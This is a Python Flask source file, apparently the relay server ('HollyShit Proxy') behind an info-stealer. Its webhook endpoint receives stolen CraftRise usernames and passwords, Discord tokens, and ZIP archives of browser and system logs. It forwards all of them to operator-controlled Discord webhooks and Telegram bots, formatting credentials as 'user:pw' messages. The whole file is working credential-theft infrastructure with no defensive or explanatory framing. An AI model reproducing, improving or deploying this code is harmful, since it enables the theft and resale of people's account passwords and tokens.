from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

def send_discord_embed(url, embed_data):
    if not url: return
    try:
        requests.post(url, json=embed_data, timeout=30)
    except Exception as e:
        print(f"Discord embed hatası: {e}")

def send_discord_with_file(url, content, file_bytes, filename="log.zip"):
    if not url or not file_bytes: return
    try:
        files = {'file': (filename, file_bytes)}
        data = {'content': content}
        requests.post(url, data=data, files=files, timeout=60)
        print(f"[+] ZIP dosyası Discord'a gönderildi")
    except Exception as e:
        print(f"Discord dosya gönderme hatası: {e}")

def send_telegram_msg(token, chat_id, msg):
    if not (token and chat_id and msg): return
    try:
        if len(str(msg)) > 4000: msg = str(msg)[:4000] + "..."
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                     json={"chat_id": chat_id, "text": msg}, timeout=30)
    except Exception as e:
        print(f"Telegram mesaj hatası: {e}")

def send_telegram_file(token, chat_id, file_bytes, filename="backup.zip"):
    if not (token and chat_id and file_bytes): return
    try:
        files = {'document': (filename, file_bytes)}
        requests.post(f"https://api.telegram.org/bot{token}/sendDocument", 
                     data={"chat_id": chat_id}, files=files, timeout=60)
        print(f"[+] ZIP dosyası Telegram'a gönderildi")
    except Exception as e:
        print(f"Telegram dosya hatası: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        if request.is_json:
            data = request.get_json()
            file_bytes = None
        else:
            data = request.form.to_dict()
            file_bytes = request.files.get('file').read() if request.files.get('file') else None
            
            # JSON alanlarını parse et
            for key in ['embeds', 'creds']:
                if key in data and isinstance(data[key], str):
                    try: data[key] = json.loads(data[key])
                    except: pass

        log_type = data.get("type", "unknown")
        print(f"[{datetime.now()}] Incoming Log Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            send_discord_embed(CRAFTRISE_WEBHOOK, data)
            creds = data.get("creds", {})
            user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
            pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
            tg_msg = f"CraftRise: {user}:{pw}"
            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
            send_telegram_msg(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            send_discord_embed(DISCORD_WEBHOOK, data)
            token_val = data.get("token_val", "Unknown")
            send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, token_val)
            send_telegram_msg(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, f"Token: {token_val}")
        
        # ============ BROWSER / SYSTEM / MASTER ============
        else:
            content_text = data.get("content", "")
            
            # Discord'a her halükarda gönder
            if file_bytes:
                send_discord_with_file(MASTER_WEBHOOK, content_text, file_bytes)
                send_discord_with_file(WEBHOOK, content_text, file_bytes)
                # Telgram'a ZIP'i de gönder (Backup)
                send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, "log_backup.zip")
                send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, "log_backup.zip")
            else:
                send_discord_embed(MASTER_WEBHOOK, data)
                send_discord_embed(WEBHOOK, data)
            
            # Telegram Metin Mesajı Oluştur
            tg_msg = f"New Log: {content_text}\n" if content_text else "Log Details:\n"
            embeds = data.get("embeds", [])
            if isinstance(embeds, list):
                for embed in embeds:
                    title = embed.get("title", "")
                    # Analysis Stats veya System Info gibi başlıkları temizle
                    title_clean = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', title).strip()
                    if title_clean: tg_msg += f"\n--- {title_clean} ---\n"
                    
                    fields = embed.get("fields", [])
                    if isinstance(fields, list):
                        for field in fields:
                            name = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', field.get('name', '')).strip()
                            value = re.sub(r'```[a-z]*\n|```', '', field.get('value', '')).strip()
                            # Eğer value bir link içeriyorsa (markdown [Text](URL))
                            link_match = re.search(r'\[.*?\]\((https?://.*?)\)', value)
                            if link_match:
                                value = link_match.group(1)
                            
                            tg_msg += f"{name}: {value}\n"
                    
                    if embed.get("url") and embed.get("url") != "#":
                        tg_msg += f"Download: {embed['url']}\n"
            
            send_telegram_msg(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
            send_telegram_msg(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Global Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home(): return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
